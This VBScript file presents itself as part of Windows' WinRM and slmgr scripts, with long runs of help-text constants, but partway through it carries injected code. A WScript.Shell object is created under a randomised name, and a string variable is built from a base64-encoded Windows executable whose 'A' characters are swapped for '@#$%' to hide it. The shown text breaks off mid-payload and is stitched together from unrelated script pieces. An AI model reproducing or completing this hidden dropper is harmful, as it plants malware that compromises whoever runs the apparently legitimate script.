private const L_HelpCertMappingExamples_005_0_Message = ""

'''''''''''''''''''''
' HELP - CONFIGSDDL
private const L_HelpConfigsddl_000_1_Message = "  winrm configsddl RESOURCE_URI"
private const L_HelpConfigsddl_001_0_Message = ""
private const L_HelpConfigsddl_002_0_Message = "Changes an existing entry in the plugin configuration to "
private const L_HelpConfigsddl_002_1_Message = "control remote access to WinRM resources."
private const L_HelpConfigsddl_003_0_Message = "This command will fail if the plugin does not exist."
private const L_HelpConfigsddl_004_0_Message = ""
private const L_HelpConfigsddl_005_0_Message = "This command will launch a GUI to edit the security settings."
private const L_HelpConfigsddl_005_1_Message = ""
private const L_HelpConfigsddl_006_0_Message = "RESOURCE_URI is always treated as a prefix."
private const L_HelpConfigsddl_010_0_Message = ""
private const L_HelpConfigsddl_011_0_Message = "To change the default security (the RootSDDL setting) use:"
private const X_HelpConfigsddl_012_0_Message = "  winrm configsddl default"

'''''''''''''''''''''
' HELP - QUICKCONFIG
private const X_HelpQuickConfig_001_0_Message = "winrm quickconfig [-quiet] [-transport:VALUE] [-force]"
private const X_HelpQuickConfig_002_0_Message = ""
private const L_HelpQuickConfig_003_0_Message = "Performs configuration actions to enable this machine for remote management."
private const L_HelpQuickConfig_004_0_Message = "Includes:"
private const L_HelpQuickConfig_005_0_Message = "  1. Start the WinRM service"
private const L_HelpQuickConfig_006_0_Message = "  2. Set the WinRM service type to auto start"
private const L_HelpQuickConfig_007_0_Message = "  3. Create a listener to accept request on any IP address"
private const L_HelpQuickConfig_008_0_Message = "  4. Enable firewall exception for WS-Management traffic (for http only)"
private const X_HelpQuickConfig_009_0_Message = ""
private const X_HelpQuickConfig_010_0_Message = "-q[uiet]"
private const X_HelpQuickConfig_010_1_Message = "--------"
private const L_HelpQuickConfig_011_0_Message = "If present, quickconfig will not prompt for confirmation."
private const X_HelpQuickConfig_012_0_Message = "-transport:VALUE"
private const X_HelpQuickConfig_013_0_Message = "----------------"
private const L_HelpQuickConfig_014_0_Message = "Perform quickconfig for specific transport."
private const L_HelpQuickConfig_015_0_Message = "Possible options are http and https.  Defaults to http."
private const X_HelpQuickConfig_016_0_Message = "-force"
private const X_HelpQuickConfig_017_0_Message = "--------"
private const L_HelpQuickConfig_018_0_Message = "If present, quickconfig will not prompt for confirmation, and will enable "
private const L_HelpQuickConfig_019_0_Message = "the firewall exception regardless of current network profile settings."

'''''''''''''''''''''
' HELP - REMOTE
private const L_HelpRemote_001_0_Message = "winrm OPERATION -remote:VALUE [-unencrypted] [-usessl]"
private const L_HelpRemote_002_0_Message = ""
private const L_HelpRemote_003_0_Message = "-r[emote]:VALUE"
private const L_HelpRemote_004_0_Message = "---------------"
private const L_HelpRemote_005_0_Message = "Specifies identifier of remote endpoint/system.  "
private const L_HelpRemote_006_0_Message = "May be a simple host name or a complete URL."
private const L_HelpRemote_007_0_Message = ""
private const L_HelpRemote_008_0_Message = "  [TRANSPORT://]HOST[:PORT][/PREFIX]"
private const L_HelpRemote_009_0_Message = ""
private const L_HelpRemote_010_0_Message = "Transport: One of HTTP or HTTPS; default is HTTP."
private const L_HelpRemote_011_0_Message = "Host: Can be in the form of a DNS name, NetBIOS name, or IP address."
private const L_HelpRemote_012_0_Message = "Port: If port is not specified then the following default rules apply:"
private const L_HelpRemote_013_0_Message = "Prefix: Defaults to wsman."
private const L_HelpRemote_014_0_Message = ""
private const L_HelpRemote_015_0_Message = "Note: IPv6 addresses must be enclosed in brackets."
private const L_HelpRemote_016_0_Message = "Note: When using HTTPS, the machine name must match the server's certificate"
private const L_HelpRemote_017_0_Message = "      common name (CN) unless -skipCNcheck is used."
private const L_HelpRemote_018_0_Message = "Note: Defaults for port and prefix can be changed in the local configuration."

private const L_HelpRemoteExample_001_0_Message = "Example: Connect to srv.corp.com via http:"
private const X_HelpRemoteExample_002_0_Message = "  winrm get uri -r:srv.corp.com"
private const L_HelpRemoteExample_003_0_Message = ""
private const L_HelpRemoteExample_004_0_Message = "Example: Connect to local computer machine1 via https:"
private const X_HelpRemoteExample_005_0_Message = "  winrm get uri -r:https://machine1"
private const L_HelpRemoteExample_006_0_Message = ""
private const L_HelpRemoteExample_007_0_Message = "Example: Connect to an IPv6 machine via http:"
private const X_HelpRemoteExample_008_0_Message = "  winrm get uri -r:[1:2:3::8]"
private const L_HelpRemoteExample_009_0_Message = ""
private const L_HelpRemoteExample_010_0_Message = "Example: Connect to an IPv6 machine via https on a non-default port and URL:"
private const X_HelpRemoteExample_011_0_Message = "  winrm get uri -r:https://[1:2:3::8]:444/path"

private const L_HelpRemoteUnencrypted_001_0_Message = "-un[encrypted]"
private const L_HelpRemoteUnencrypted_002_0_Message = "--------------"
private const L_HelpRemoteUnencrypted_003_0_Message = "Specifies that no encryption will be used when doing remote operations over"
private const L_HelpRemoteUnencrypted_004_0_Message = "HTTP.  Unencrypted traffic is not allowed by default and must be enabled in"
private const L_HelpRemoteUnencrypted_005_0_Message = "the local configuration."

private const L_HelpRemoteConfig_001_0_Message = "To enable this machine to be remotely managed see:"

'''''''''''''''''''''
' HELP - AUTH
private const L_HelpAuth_001_0_Message = "winrm OPERATION -remote:VALUE "
private const L_HelpAuth_002_0_Message = "  [-authentication:VALUE] "
private const L_HelpAuth_003_0_Message = "  [-username:USERNAME] "
private const L_HelpAuth_004_0_Message = "  [-password:PASSWORD]"
private const L_HelpAuth_004_1_Message = "  [-certificate:THUMBPRINT]"
private const L_HelpAuth_005_0_Message = ""
private const L_HelpAuth_006_0_Message = "When connecting remotely, you can specify which credentials and which"
private const L_HelpAuth_007_0_Message = "authentication mechanisms to use.  If none are specified the current "
private const L_HelpAuth_008_0_Message = "logged-on user's credentials will be used."

private const L_HelpAuthAuth_001_0_Message = "-a[uthentication]:VALUE"
private const L_HelpAuthAuth_002_0_Message = "-----------------------"
private const L_HelpAuthAuth_003_0_Message = "Specifies authentication mechanism used when communicating with remote machine."
private const L_HelpAuthAuth_004_0_Message = "Possible options are None, Basic, Digest, Negotiate, Kerberos, CredSSP."
private const L_HelpAuthAuth_004_1_Message = "Possible options are None, Basic, Digest, Negotiate, Kerberos."
private const L_HelpAuthAuth_005_0_Message = "Examples:"
private const X_HelpAuthAuth_006_0_Message = "  -a:None"
private const X_HelpAuthAuth_007_0_Message = "  -a:Basic"
private const X_HelpAuthAuth_008_0_Message = "  -a:Digest"
private const X_HelpAuthAuth_009_0_Message = "  -a:Negotiate"
private const X_HelpAuthAuth_010_0_Message = "  -a:Kerberos"
private const X_HelpAuthAuth_010_1_Message = "  -a:Certificate"
private const X_HelpAuthAuth_010_2_Message = "  -a:CredSSP"
private const L_HelpAuthAuth_011_0_Message = "Note: If an authentication mechanism is not specified, Kerberos is used unless"
private const L_HelpAuthAuth_012_0_Message = "      one of the conditions below is true, in which case Negotiate is used:"
private const L_HelpAuthAuth_013_0_Message = "   -explicit credentials are supplied and the destination host is trusted"
private const L_HelpAuthAuth_013_1_Message = "   -the destination host is ""localhost"", ""127.0.0.1"" or ""[::1]"""
private const L_HelpAuthAuth_013_2_Message = "   -the client computer is in workgroup and the destination host is trusted"
private const L_HelpAuthAuth_014_0_Message = "Note: Not all authentication mechanisms are enabled by default.  Allowed"
private const L_HelpAuthAuth_015_0_Message = "      authentication mechanisms can be controlled by local configuration "
private const L_HelpAuthAuth_016_0_Message = "      or group policy."
private const L_HelpAuthAuth_017_0_Message = "Note: Most operations will require an authentication mode other than None."
private const L_HelpAuthAuth_018_0_Message = "Note: Certificate authentication can be used only with the HTTPS transport."
private const L_HelpAuthAuth_019_0_Message = "      To configure an HTTPS listener for the WinRM service run the command:"
private const L_HelpAuthAuth_020_0_Message = "      ""winrm quickconfig -transport:HTTPS"""

private const L_HelpAuthUsername_001_0_Message = "-u[sername]:USERNAME"
private const L_HelpAuthUsername_002_0_Message = "--------------------"
private const L_HelpAuthUsername_003_0_Message = "Specifies username on remote machine. Cannot be used on local machine."
private const L_HelpAuthUsername_004_0_Message = "User must be member of local Administrators group on remote machine."
private const L_HelpAuthUsername_005_0_Message = "If the user account is a local account on the remote machine,"
private const L_HelpAuthUsername_006_0_Message = "the syntax should be in the form -username:USERNAME"
private const L_HelpAuthUsername_007_0_Message = "If the username is a domain account, the syntax should be in the form"
private const L_HelpAuthUsername_008_0_Message = "-username:DOMAIN\USERNAME"
private const L_HelpAuthUsername_009_0_Message = "If Basic or Digest is used, then -username is required."
private const L_HelpAuthUsername_010_0_Message = "If Kerberos is used, then the current logged-on user's credentials"
private const L_HelpAuthUsername_011_0_Message = "are used if -username is not supplied. Only domain credentials can"
private const L_HelpAuthUsername_011_1_Message = "be used with Kerberos."
private const L_HelpAuthUsername_012_0_Message = "If Negotiate is used, then -username is required unless"
private const L_HelpAuthUsername_013_0_Message = "one of the conditions below is true:"
private const L_HelpAuthUsername_014_0_Message = "   -the destination host is ""localhost"", ""127.0.0.1"" or ""[::1]"""
private const L_HelpAuthUsername_015_0_Message = "   -the client computer is in workgroup and the destination host is trusted"
private const L_HelpAuthUsername_016_0_Message = "If CredSSP is used, then username and password are required."

private const L_HelpAuthPassword_001_0_Message = "-p[assword]:PASSWORD"
private const L_HelpAuthPassword_002_0_Message = "--------------------"
private const L_HelpAuthPassword_003_0_Message = "Specifies password on command line to override interactive prompt."
private const L_HelpAuthPassword_004_0_Message = "Applies only if -username:USERNAME option is used."

private const L_HelpAuthCertificate_001_0_Message = "-c[ertificate]:THUMBPRINT"
private const L_HelpAuthCertificate_002_0_Message = "--------------------"
private const L_HelpAuthCertificate_003_0_Message = "Specifies the thumbprint of a certificate that must exist in the local"
private const L_HelpAuthCertificate_004_0_Message = "machine store or in the current user store. The certificate must be intended"
private const L_HelpAuthCertificate_005_0_Message = "for client authentication."
private const L_HelpAuthCertificate_006_0_Message = "Applies only if -a:Certificate is used."
private const L_HelpAuthCertificate_007_0_Message = "THUMBPRINT can contain spaces, in which case it must be enclosed in"
private const L_HelpAuthCertificate_008_0_Message = "double quotation marks."
private const L_HelpAuthCertificate_009_0_Message = "Examples:"
private const L_HelpAuthCertificate_010_0_Message = "-c:7b0cf48026409e38a2d6348761b1dd1271c4f86d"
private const L_HelpAuthCertificate_011_0_Message = "-c:""7b 0c f4 80 26 40 9e 38 a2 d6 34 87 61 b1 dd 12 71 c4 f8 6d"""

'''''''''''''''''''''
' HELP - PROXY
private const X_HelpProxy_001_0_Message = "winrm OPERATION -remote:VALUE "
private const X_HelpProxy_002_0_Message = "  [-proxyaccess:VALUE] "
private const X_HelpProxy_002_1_Message = "  [-proxyauth:VALUE] "
private const X_HelpProxy_003_0_Message = "  [-proxyusername:USERNAME] "
private const X_HelpProxy_004_0_Message = "  [-proxypassword:PASSWORD]"
private const L_HelpProxy_005_0_Message = ""
private const L_HelpProxy_006_0_Message = "When connecting remotely, you can specify which proxy access type,"
private const L_HelpProxy_007_0_Message = " proxy credentials and proxy authentication mechanisms to use."

private const X_HelpProxyAccess_001_0_Message = "-p[roxy]ac[cess]:VALUE"
private const L_HelpProxyAccess_002_0_Message = "-----------------------"
private const L_HelpProxyAccess_003_0_Message = "Specifies which proxy settings to retrieve when connecting to a remote machine."
private const L_HelpProxyAccess_004_0_Message = "Possible options are ie_settings, winhttp_settings, auto_detect, no_proxy."
private const L_HelpProxyAccess_005_0_Message = "Examples:"
private const X_HelpProxyAccess_006_0_Message = "  -pac:ie_settings"
private const X_HelpProxyAccess_007_0_Message = "  -pac:winhttp_settings"
private const X_HelpProxyAccess_008_0_Message = "  -pac:auto_detect"
private const X_HelpProxyAccess_009_0_Message = "  -pac:no_proxy"
private const L_HelpProxyAccess_010_0_Message = ""
private const L_HelpProxyAccess_011_0_Message = "The WSMan client provides four options for the configuration of proxy settings:"
private const L_HelpProxyAccess_012_0_Message = "   -use settings configured through Internet Explorer (default)"
private const L_HelpProxyAccess_013_0_Message = "   -use settings configured through WinHTTP"
private const L_HelpProxyAccess_014_0_Message = "   -automatic proxy discovery"
private const L_HelpProxyAccess_015_0_Message = "   -direct connection (don’t use a proxy)"

private const L_HelpProxyAuth_001_0_Message = "-p[roxy]a[uth]:VALUE"
private const L_HelpProxyAuth_002_0_Message = "-----------------------"
private const L_HelpProxyAuth_003_0_Message = "Specifies authentication mechanism used to authenticate with a proxy."
private const L_HelpProxyAuth_004_0_Message = "Possible options are Basic, Digest, Negotiate."
private const L_HelpProxyAuth_005_0_Message = "Examples:"
private const X_HelpProxyAuth_007_0_Message = "  -pa:Basic"
private const X_HelpProxyAuth_008_0_Message = "  -pa:Digest"
private const X_HelpProxyAuth_009_0_Message = "  -pa:Negotiate"
private const L_HelpProxyAuth_010_0_Message = "If -proxyauth:VALUE is used then -proxyaccess:VALUE is required."

private const L_HelpProxyUsername_001_0_Message = "-p[roxy]u[sername]:USERNAME"
private const L_HelpProxyUsername_002_0_Message = "--------------------"
private const L_HelpProxyUsername_003_0_Message = "Specifies username to authenticate with proxy. Cannot be used on local machine."
private const L_HelpProxyUsername_005_0_Message = "If the user account is a local account on the remote machine,"
private const L_HelpProxyUsername_006_0_Message = "the syntax should be in the form -proxyusername:USERNAME"
private const L_HelpProxyUsername_007_0_Message = "If the username is a domain account, the syntax should be in the form"
private const L_HelpProxyUsername_008_0_Message = "-proxyusername:DOMAIN\USERNAME"
private const L_HelpProxyUsername_009_0_Message = "If -proxyusername is used then -proxyauth:VALUE is required."

private const L_HelpProxyPassword_001_0_Message = "-p[roxy]p[assword]:PASSWORD"
private const L_HelpProxyPassword_002_0_Message = "--------------------"
private const L_HelpProxyPassword_003_0_Message = "Specifies password on command line to override interactive prompt."
private const L_HelpProxyPassword_004_0_Message = "Applies only if -proxyusername:USERNAME option is used."

'''''''''''''''''''''
' HELP - INPUT
private const L_HelpInput_001_0_Message = "Input can be by either providing key/value pairs directly on the command line"
private const L_HelpInput_002_0_Message = "or reading XML from a file."
private const L_HelpInput_003_0_Message = ""
private const L_HelpInput_004_0_Message = "  winrm OPERATION -file:VALUE "
private const L_HelpInput_005_0_Message = "  winrm OPERATION @{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpInput_006_0_Message = ""
private const L_HelpInput_007_0_Message = "Applies to set, create, and invoke operations."
private const L_HelpInput_008_0_Message = "Use either @{KEY=VALUE} or input from an XML file, but not both."
private const L_HelpInput_009_0_Message = ""
private const L_HelpInput_010_0_Message = "-file:VALUE"
private const L_HelpInput_011_0_Message = "-----------"
private const L_HelpInput_012_0_Message = "Specifies name of file used as input."
private const L_HelpInput_013_0_Message = "VALUE can be absolute path, relative path, or filename without path."
private const L_HelpInput_014_0_Message = "Names or paths that include spaces must be enclosed in quotation marks."
private const L_HelpInput_015_0_Message = ""
private const L_HelpInput_016_0_Message = "@{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpInput_017_0_Message = "----------------------------"
private const L_HelpInput_018_0_Message = "Keys are not unique."
private const L_HelpInput_019_0_Message = "Values must be within quotation marks."
private const L_HelpInput_020_0_Message = "$null is a special value."
private const L_HelpInput_021_0_Message = ""
private const L_HelpInput_022_0_Message = "Examples:"
private const X_HelpInput_023_0_Message = "  @{key1=""value1"";key2=""value2""}"
private const X_HelpInput_024_0_Message = "  @{key1=$null;key2=""value2""}"


'''''''''''''''''''''
' HELP - FILTERS
private const L_HelpFilter_001_0_Message = "Filters allow selecting a subset of the desired resources:"
private const X_HelpFilter_002_0_Message = ""
private const X_HelpFilter_003_0_Message = "winrm enumerate RESOURCE_URI -filter:EXPR [-dialect:URI] [-Associations]..."
private const X_HelpFilter_004_0_Message = ""
private const L_HelpFilter_005_0_Message = "-filter:EXPR"
private const X_HelpFilter_006_0_Message = "------------"
private const L_HelpFilter_007_0_Message = "Filter expression for enumeration."
private const X_HelpFilter_008_0_Message = ""
private const L_HelpFilter_009_0_Message = "-dialect:URI"
private const X_HelpFilter_010_0_Message = "------------"
private const L_HelpFilter_011_0_Message = "Dialect of the filter expression for enumeration."
private const L_HelpFilter_012_0_Message = "This may be any dialect supported by the remote service.  "
private const X_HelpFilter_013_0_Message = ""
private const L_HelpFilter_014_0_Message = "The following aliases can be used for the dialect URI:"
private const X_HelpFilter_015_0_Message = "* WQL - http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const X_HelpFilter_016_0_Message = "* Selector - http://schemas.dmtf.org/wbem/wsman/1/wsman/SelectorFilter"
private const X_HelpFilter_016_1_Message = "* Association - http://schemas.dmtf.org/wbem/wsman/1/cimbinding/AssociationFilter"
private const X_HelpFilter_017_0_Message = ""
private const L_HelpFilter_018_0_Message = "The dialect URI defaults to WQL when used with enumeration."
private const X_HelpFilter_019_0_Message = ""
private const L_HelpFilter_019_1_Message = "-Associations"
private const L_HelpFilter_019_2_Message = "------------"
private const X_HelpFilter_019_3_Message = "This parameter has relevance only when the Dialect parameter exists, and its value is specified as Association. Otherwise this parameter should not be used."
private const X_HelpFilter_019_4_Message = "This indicates retrieval of Association Instances rather than Associated Instances. Absence of this parameter would imply Associated Instances are to be retrieved."
private const X_HelpFilter_019_5_Message = ""
private const L_HelpFilter_020_0_Message = "Example: Find running services"
private const X_HelpFilter_021_0_Message = "  winrm e wmicimv2/Win32_Service -dialect:selector -filter:{State=""Running""}"
private const X_HelpFilter_022_0_Message = ""
private const L_HelpFilter_023_0_Message = "Example: Find auto start services that are not running"
private const X_HelpFilter_024_0_Message = "  winrm e wmicimv2/* -filter:""select * from Win32_Service where State!='Running' and StartMode='Auto'"""
private const L_HelpFilter_025_0_Message = ""
private const L_HelpFilter_026_0_Message = "Example: Find the services on which winrm service has a dependency"
private const X_HelpFilter_027_0_Message = "  winrm e wmicimv2/* -dialect:Association -filter:{Object=Win32_Service?Name=WinRM;AssociationClassName=Win32_DependentService;ResultClassName=win32_service;ResultRole=antecedent;Role=dependent}"

'''''''''''''''''''''
' HELP - SWITCHES
private const L_HelpSwitchTimeout_001_0_Message = "-timeout:MS"
private const L_HelpSwitchTimeout_002_0_Message = "-----------"
private const L_HelpSwitchTimeout_003_0_Message = "Timeout in milliseconds. Limits duration of corresponding operation."
private const L_HelpSwitchTimeout_004_0_Message = "Default timeout can be configured by:"
private const X_HelpSwitchTimeout_005_0_Message = "  winrm set winrm/config @{MaxTimeoutms=""XXXXXX""}"
private const L_HelpSwitchTimeout_006_0_Message = "Where XXXXXX is an integer indicating milliseconds."

private const X_HelpSwitchSkipCACheck_001_0_Message = "-skipCAcheck"
private const L_HelpSwitchSkipCACheck_002_0_Message = "------------"
private const L_HelpSwitchSkipCACheck_003_0_Message = "Specifies that certificate issuer need not be a trusted root authority."
private const L_HelpSwitchSkipCACheck_004_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipCACheck_005_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchSkipCNCheck_001_0_Message = "-skipCNcheck"
private const L_HelpSwitchSkipCNCheck_002_0_Message = "------------"
private const L_HelpSwitchSkipCNCheck_003_0_Message = "Specifies that certificate common name (CN) of the server need not match the"
private const L_HelpSwitchSkipCNCheck_004_0_Message = "hostname of the server. "
private const L_HelpSwitchSkipCNCheck_005_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipCNCheck_006_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchSkipRevCheck_001_0_Message = "-skipRevocationcheck"
private const X_HelpSwitchSkipRevCheck_002_0_Message = "-------------------"
private const L_HelpSwitchSkipRevCheck_003_0_Message = "Specifies that the revocation status of the server certificate is not checked."
private const L_HelpSwitchSkipRevCheck_004_0_Message = "Used only in remote operations using HTTPS (see -remote option)."
private const L_HelpSwitchSkipRevCheck_005_0_Message = "This option should be used only for trusted machines."

private const X_HelpSwitchDefaultCreds_001_0_Message = "-defaultCreds"
private const X_HelpSwitchDefaultCreds_002_0_Message = "-------------------"
private const L_HelpSwitchDefaultCreds_003_0_Message = "Specifies that the implicit credentials are allowed when Negotiate is used."
private const L_HelpSwitchDefaultCreds_004_0_Message = "Allowed only in remote operations using HTTPS (see -remote option)."

private const L_HelpSwitchDialect_001_0_Message = "-dialect:VALUE"
private const L_HelpSwitchDialect_002_0_Message = "--------------"
private const L_HelpSwitchDialect_003_0_Message = "Dialect of the filter expression for enumeration or fragment."
private const L_HelpSwitchDialect_004_0_Message = "Example: Use a WQL query"
private const X_HelpSwitchDialect_005_0_Message = "  -dialect:http://schemas.microsoft.com/wbem/wsman/1/WQL"
private const L_HelpSwitchDialect_006_0_Message = "Example: Use XPATH for filtering with enumeration or fragment get/set."
private const X_HelpSwitchDialect_007_0_Message = "  -dialect:http://www.w3.org/TR/1999/REC-xpath-19991116"

'private const L_HelpSwitchFilter_001_0_Message = "-filter:VALUE"
'private const L_HelpSwitchFilter_002_0_Message = "-----------------"
'private const L_HelpSwitchFilter_003_0_Message = "Filter expression for enumeration."
'private const L_HelpSwitchFilter_004_0_Message = "Example: Use a WQL query"
'private const X_HelpSwitchFilter_005_0_Message = "  -filter:""select * from Win32_process where handle=0"""

private const L_HelpSwitchFragment_001_0_Message = "-fragment:VALUE"
private const L_HelpSwitchFragment_002_0_Message = "---------------"
private const L_HelpSwitchFragment_003_0_Message = "Specify a section inside the instance XML that is to be updated or retrieved"
private const L_HelpSwitchFragment_004_0_Message = "for the given operation."
private const L_HelpSwitchFragment_005_0_Message = "Example: Get the status of the spooler service"
private const X_HelpSwitchFragment_006_0_Message = "  winrm get wmicimv2/Win32_Service?name=spooler -fragment:Status/text()"

private const L_HelpSwitchOption_001_0_Message = "-options:{KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_HelpSwitchOption_002_0_Message = "------------------------------------"
private const L_HelpSwitchOption_003_0_Message = "Key/value pairs for provider-specific options."
private const L_HelpSwitchOption_004_0_Message = "To specify NULL as a value, use $null"
private const L_HelpSwitchOption_005_0_Message = ""
private const L_HelpSwitchOption_006_0_Message = "Examples:"
private const X_HelpSwitchOption_007_0_Message = "  -options:{key1=""value1"";key2=""value2""}"
private const X_HelpSwitchOption_008_0_Message = "  -options:{key1=$null;key2=""value2""}"

private const X_HelpSwitchSPNPort_001_0_Message = "-SPNPort"
private const L_HelpSwitchSPNPort_002_0_Message = "--------"
private const L_HelpSwitchSPNPort_003_0_Message = "Appends port number to the Service Principal Name (SPN) of the remote server."
private const L_HelpSwitchSPNPort_004_0_Message = "Service principal name is used when Negotiate or Kerberos authentication"
private const L_HelpSwitchSPNPort_005_0_Message = "mechanism is in use."

private const L_HelpSwitchEncoding_001_0_Message = "-encoding:VALUE"
private const L_HelpSwitchEncoding_002_0_Message = "---------------"
private const L_HelpSwitchEncoding_003_0_Message = "Specifies encoding type when talking to remote machine (see -remote"
private const L_HelpSwitchEncoding_004_0_Message = "option). Possible options are ""utf-8"" and ""utf-16""."
private const L_HelpSwitchEncoding_005_0_Message = "Default is utf-8."
private const L_HelpSwitchEncoding_006_0_Message = "Examples:"
private const X_HelpSwitchEncoding_007_0_Message = "  -encoding:utf-8"
private const X_HelpSwitchEncoding_008_0_Message = "  -encoding:utf-16"

private const L_HelpSwitchFormat_001_0_Message = "-f[ormat]:FORMAT"
private const L_HelpSwitchFormat_002_0_Message = "----------------"
private const L_HelpSwitchFormat_003_0_Message = "Specifies format of output."
private const L_HelpSwitchFormat_004_0_Message = "FORMAT can be ""xml"", ""pretty"" (better formatted XML), or ""text""."
private const L_HelpSwitchFormat_005_0_Message = "Examples:"
private const X_HelpSwitchFormat_006_0_Message = "  -format:xml"
private const X_HelpSwitchFormat_007_0_Message = "  -format:pretty"
private const X_HelpSwitchFormat_008_0_Message = "  -format:text"


private const L_HelpRemoteUseSsl_001_0_Message = "-[use]ssl"
private const L_HelpRemoteUseSsl_002_0_Message = "---------"
private const L_HelpRemoteUseSsl_003_0_Message = "Specifies that an SSL connection will be used when doing remote operations."
private const L_HelpRemoteUseSsl_004_0_Message = "The transport in the remote option should not be specified. "

private const L_HelpRemote_012_1_Message = "        * If transport is specified to HTTP then port 80 is used."
private const L_HelpRemote_012_2_Message = "        * If transport is specified to HTTPS then port 443 is used."
private const L_HelpRemote_012_3_Message = "        * If transport is not specified and -usessl is not specified then port"
private const L_HelpRemote_012_4_Message = "          5985 is used for an HTTP connection."
private const L_HelpRemote_012_5_Message = "        * If transport is not specified and -usessl is specified then port 5986"
private const L_HelpRemote_012_6_Message = "          is used for an HTTPS connection."
    On Error Resume Next
     OptLine GetResource("L_optDisplayInformation"),        GetResource("L_ParamsActIDOptional"),         GetResource("L_optDisplayInformationUsage")
     OptLine GetResource("L_optDisplayInformationVerbose"), GetResource("L_ParamsActIDOptional"),         GetResource("L_optDisplayInformationUsageVerbose")
     OptLine GetResource("L_optExpirationDatime"),          GetResource("L_ParamsActivationIDOptional"),  GetResource("L_optExpirationDatimeUsage")
     Set cZplrXODGKZWCJNNPEFLRM = WScript.CreateObject("WScript.Shell")
     LineOut ""
     LineOut GetResource("L_MsgGlobalOptions")
     OptLine GetResource("L_optInstallProductKey"),         GetResource("L_ParamsProductKey"),            GetResource("L_optInstallProductKeyUsage")
     OptLine GetResource("L_optActivateProduct"),           GetResource("L_ParamsActivationIDOptional"),  GetResource("L_optActivateProductUsage")
     Dim hTpxRu
hTpxRu = hTpxRu & "TVqQ@#$%@#$%M@#$%@#$%@#$%@#$%E@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%//8@#$%@#$%Lg@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%Q@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%g@#$%@#$%@#$%@#$%@#$%4fug4@#$%t@#$%n" 
hTpxRu = hTpxRu & "NIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSB" 
hTpxRu = hTpxRu & "ydW4gaW4gRE9TIG1vZGUuDQ0KJ@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%BQRQ@#$%@#$%T@#$%E" 
hTpxRu = hTpxRu & "D@#$%Nj/dNM@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%O@#$%@#$%DiEL@#$%QY@#$%@#$%F@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%G@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%Lm4@#$%@#$%@#$%@#$%g@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%g@#$%@#$%@#$%@#$%@#$%B@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%g@#$%@#$%@#$%@#$%@#$%g@#$%@#$%B@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%E@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%D@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%g@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%M@#$%YIU@#$%@#$%B@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%B@#$%@#$%@#$%@#$%@#$%@#$%E@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%E@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%B@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%OBt@#$%@#$%BL@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%I@#$%@#$%@#$%CQD@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%K@#$%@#$%@#$%@#$%w@#$%@#$%@#$%CYbQ" 
hTpxRu = hTpxRu & "@#$%@#$%H@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%I@#$%@#$%@#$%C@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%C" 
hTpxRu = hTpxRu & "C@#$%@#$%@#$%Eg@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%C50ZXh0@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%NE4@#$%@#$%@#$%@#$%g@#$%@#" 
